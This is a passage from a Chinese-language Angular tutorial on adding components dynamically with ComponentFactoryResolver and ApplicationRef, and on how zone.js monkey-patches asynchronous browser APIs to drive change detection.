</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>我打算插入一个div到组件一中</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> newNode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
newNode<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token string">'placeholder'</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>newNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>组件一的模板现在变为</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>My Component<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>placeholder<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>我期待的结果为</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>My Component<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>placeholder<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>simple-cmp</span><span class="token punctuation">&gt;</span></span>Hello world!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>simple-cmp</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>我想做的就是动态添加SimpleComopent实例到#placeholder div中
1 创建一个组件指向它需要添加的根节点上
2 attach这个视图 用 ApplicationRef以便于你能够变化检测。你仍然没有Input和ngOnChanges操作，但是更新DOM应该没有问题了</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
        &lt;div id=&quot;container&quot;&gt;
          &lt;h1&gt;My Component&lt;/h1&gt;
        &lt;/div&gt;
       </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
      selector<span class="token operator">:</span> <span class="token string">'my-app'</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> 
      <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> resolver<span class="token operator">:</span> ComponentFactoryResolver<span class="token punctuation">,</span>
                  <span class="token keyword">private</span> injector<span class="token operator">:</span> Injector<span class="token punctuation">,</span>
                  <span class="token keyword">private</span> app<span class="token operator">:</span> ApplicationRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
      <span class="token punctuation">}</span>
      <span class="token function">addDynamicComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">let</span> factory <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>resolver<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>SimpleComponent<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">let</span> newNode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         newNode<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token string">'placeholder'</span><span class="token punctuation">;</span>
         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>newNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">const</span> ref <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> newNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>app<span class="token punctuation">.</span><span class="token function">attachView</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span>hostView<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>实例2：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">DrawService</span> <span class="token punctuation">{</span>
  component<span class="token operator">:</span> ComponentFactory<span class="token operator">&lt;</span>DrawComponent<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  ref<span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span>DrawComponent<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  promise<span class="token operator">:</span> Promise<span class="token operator">&lt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> resolver<span class="token operator">:</span> ComponentFactoryResolver<span class="token punctuation">,</span>
              <span class="token keyword">private</span> injector<span class="token operator">:</span> Injector<span class="token punctuation">,</span>
              <span class="token keyword">private</span> applicationRef<span class="token operator">:</span> ApplicationRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function">open</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token operator">:</span> any</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>component <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>component <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>resolver<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>DrawComponent<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> node <span class="token operator">=</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>component<span class="token punctuation">.</span>selector<span class="token punctuation">)</span><span class="token punctuation">,</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>firstChild<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>ref <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>component<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 用ApplicationRef的attach()方法把这个视图绑定到变化检测。这时候不通过Input和ngOnChanges操作就可以更新DOM了</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>applicationRef<span class="token punctuation">.</span><span class="token function">attachView</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span>hostView<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> instance<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>实例3：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> ‘aaa‘<span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AAAComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span><span class="token punctuation">,</span> AfterContentInit <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span>
        <span class="token parameter"><span class="token keyword">private</span> vcr<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">,</span>
        <span class="token keyword">private</span> cfr<span class="token operator">:</span> ComponentFactoryResolver</span>
    <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
    @<span class="token function">ContentChildren</span><span class="token punctuation">(</span><span class="token string">&quot;dynamic&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> read<span class="token operator">:</span> ElementRef <span class="token punctuation">}</span><span class="token punctuation">)</span> elem<span class="token operator">:</span> QueryList<span class="token operator">&lt;</span>ElementRef<span class="token operator">&gt;</span>  <span class="token comment">//read 的作用是强转类型</span>
    <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
    <span class="token function">ngAfterContentInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   
        <span class="token keyword">let</span> providers <span class="token operator">=</span> ReflectiveInjector<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">[</span>AbcService<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//为组件添加 providers</span>
        <span class="token keyword">let</span> injector <span class="token operator">=</span> ReflectiveInjector<span class="token punctuation">.</span><span class="token function">fromResolvedProviders</span><span class="token punctuation">(</span>providers<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>vcr<span class="token punctuation">.</span>parentInjector<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建注入器给 component </span>
        <span class="token keyword">let</span> factory <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cfr<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>AbcComponent<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建 component 工厂</span>
        <span class="token keyword">let</span> component <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>injector<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>elem<span class="token punctuation">.</span>first<span class="token punctuation">.</span>nativeElement<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>elem<span class="token punctuation">.</span>last<span class="token punctuation">.</span>nativeElement<span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建 component, 这是就把注入器放进了, 后面的 array 是给 ng-content 用的</span>
        component<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;keatkeat&quot;</span><span class="token punctuation">;</span> <span class="token comment">// 对 input, output 做点东西 </span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>vcr<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>component<span class="token punctuation">.</span>hostView<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 插入到模板中  0 是 position, 如果是 0 其实可以不用放. </span>
        <span class="token comment">// 如果不需要设定 providers 的话，可以省略一些 : </span>
        <span class="token comment">// let factory = this.resolver.resolveComponentFactory(AbcComponent);  </span>
        <span class="token comment">// let component = this.vcr.createComponent(factory, 0);</span>
        <span class="token comment">// component.instance.name = &quot;keatkeat&quot;;   </span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">关于变化检测的三点</p> <ul><li>ApplicationRef.tick() - 检查所有组件树</li> <li>NgZone.run(callback) - zone的ng实现</li> <li>ChangeDetectorRef.detectChanges() - 仅检查组件和其子组件</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//Import NgZone:</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> NgZone <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token comment">//Add it to your class constructor</span>
<span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> zone<span class="token operator">:</span> NgZone<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token comment">//Run code with zone.run:</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>zone<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>donations <span class="token operator">=</span> donations<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div></div> <h2 id="变化检测"><a href="#变化检测" class="header-anchor">#</a> 变化检测</h2> <h3 id="zones"><a href="#zones" class="header-anchor">#</a> Zones</h3> <p>Zone 是下一个 ECMAScript 规范的建议之一。Angular 团队实现了 JavaScript 版本的 zone.js ，它是用于拦截和跟踪异步工作的机制。Zone 是一个全局的对象，用来配置有关如何拦截和跟踪异步回调的规则。Zone 有以下能力：</p> <ul><li>拦截异步任务调度</li> <li>提供了将数据附加到 zones 的方法</li> <li>为异常处理函数提供正确的上下文</li> <li>拦截阻塞的方法，如 alert、confirm 方法</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 加载Zone.js给浏览器中的一些异步操作打上补丁</span>
<span class="token comment">// 创建Root Zone</span>
<span class="token comment">// 调用Zone.current对象上的fork方法创建新的zone，我们称之为childZone</span>
Zone<span class="token punctuation">.</span>current<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
      <span class="token comment">// 运行run方法，Zone.current被设置为函数被执行时所属的Zone，即childZone</span>
    Zone<span class="token punctuation">.</span>current<span class="token punctuation">.</span>inTheZone <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  
      <span class="token comment">// 这里注册了一个定时器。由于被打过了猴子补丁，这里调用的并不是</span>
    <span class="token comment">// 浏览器&quot;默认&quot;的setTimeout方法。因此，这里实际上是在配置代理。这里</span>
    <span class="token comment">// 要重点指出的是这个代理会保留一个指向创建时所属Zone的引用即childZone，</span>
    <span class="token comment">// 稍后会用到这个引用。</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 定时时间到，此时的Zone.current的值会被重置为childZone</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'in the zone: '</span> <span class="token operator">+</span> <span class="token operator">!</span><span class="token operator">!</span>Zone<span class="token punctuation">.</span>current<span class="token punctuation">.</span>inTheZone<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
      <span class="token comment">// 代码执行完 Zone.current属性被重置为Root Zone</span>
    <span class="token comment">// Zone的生命周期里的钩子函数会被触发</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'in the zone: '</span> <span class="token operator">+</span> <span class="token operator">!</span><span class="token operator">!</span>Zone<span class="token punctuation">.</span>current<span class="token punctuation">.</span>inTheZone<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>以上代码运行后的结果是：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">in</span> the zone<span class="token operator">:</span> <span class="token boolean">false</span>
<span class="token keyword">in</span> the zone<span class="token operator">:</span> <span class="token boolean">true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>如果不好理解的话，我们可以想象一下同步的过程：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> rootZone <span class="token operator">=</span> Zone<span class="token punctuation">.</span>current<span class="token punctuation">;</span>
<span class="token comment">// 创建一个新的Zone</span>
<span class="token keyword">const</span> childZone <span class="token operator">=</span> Zone<span class="token punctuation">.</span>current<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 设置当前的zone</span>
Zone<span class="token punctuation">.</span>current <span class="token operator">=</span> zone<span class="token punctuation">;</span>
<span class="token comment">// 为当前的zone添加inTheZone属性</span>
Zone<span class="token punctuation">.</span>current<span class="token punctuation">.</span>inTheZone <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'in the zone: '</span> <span class="token operator">+</span> <span class="token operator">!</span><span class="token operator">!</span>Zone<span class="token punctuation">.</span>current<span class="token punctuation">.</span>inTheZone<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 退出当前的zone</span>
Zone<span class="token punctuation">.</span>current <span class="token operator">=</span> rootZone<span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'in the zone: '</span> <span class="token operator">+</span> <span class="token operator">!</span><span class="token operator">!</span>Zone<span class="token punctuation">.</span>current<span class="token punctuation">.</span>inTheZone<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>用过 Angular 1.x 的同学，应该很清楚可以通过 Angular 1.x 中的 $timeout 服务或手动调用 $scope.$digest() 方法来通知视图刷新。这对初学者来说，是很麻烦的一件事情。为什么我们都是使用定时器，而在 Angular 2 中模型发生变化后，却能自动通知视图进行刷新呢 ？比如:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-counter'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;p&gt;当前值：{{ counter }}&lt;/p&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CounterComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>counter<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>我们来分析一下，首先在浏览器中新开一个 Tab 页，在控制台输入：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span>setTimeout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token string">&quot;function setTimeout() { [native code] }&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>然后再打开一个 Angular 应用的页面，在控制台同样输入：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span>setTimeout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">&quot;function setTimeout(){return f(this, arguments)}&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>我们发现在 Angular 中，setTimeout 方法已经被重写了。</p> <p>其实在 Angular 应用程序启动之前，Zone 采用猴子补丁 (Monkey-patched) 的方式，将 JavaScript 中的异步任务都进行了包装，这使得这些异步任务都能运行在 Zone 的执行上下文中，每个异步任务在 Zone 中都是一个任务，除了提供了一些供开发者使用的钩子外，默认情况下 Zone 重写了以下方法：</p> <ul><li>setInterval、clearInterval、setTimeout、clearTimeout</li> <li>alert、prompt、confirm</li> <li>requestAnimationFrame、cancelAnimationFrame</li> <li>addEventListener、removeEventListener</li></ul> <p>Zone 内部源码片段：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token keyword">set</span> <span class="token operator">=</span> <span class="token string">'set'</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> clear <span class="token operator">=</span> <span class="token string">'clear'</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> blockingMethods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'alert'</span><span class="token punctuation">,</span> <span class="token string">'prompt'</span><span class="token punctuation">,</span> <span class="token string">'confirm'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> _global <span class="token operator">=</span> <span class="token keyword">typeof</span> window <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> window <span class="token operator">||</span> 
     <span class="token keyword">typeof</span> self <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> self <span class="token operator">||</span> global<span class="token punctuation">;</span>
<span class="token function">patchTimer</span><span class="token punctuation">(</span>_global<span class="token punctuation">,</span> <span class="token keyword">set</span><span class="token punctuation">,</span> clear<span class="token punctuation">,</span> <span class="token string">'Timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">patchTimer</span><span class="token punctuation">(</span>_global<span class="token punctuation">,</span> <span class="token keyword">set</span><span class="token punctuation">,</span> clear<span class="token punctuation">,</span> <span class="token string">'Interval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">patchTimer</span><span class="token punctuation">(</span>_global<span class="token punctuation">,</span> <span class="token keyword">set</span><span class="token punctuation">,</span> clear<span class="token punctuation">,</span> <span class="token string">'Immediate'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">patchTimer</span><span class="token punctuation">(</span>_global<span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'cancel'</span><span class="token punctuation">,</span> <span class="token string">'AnimationFrame'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
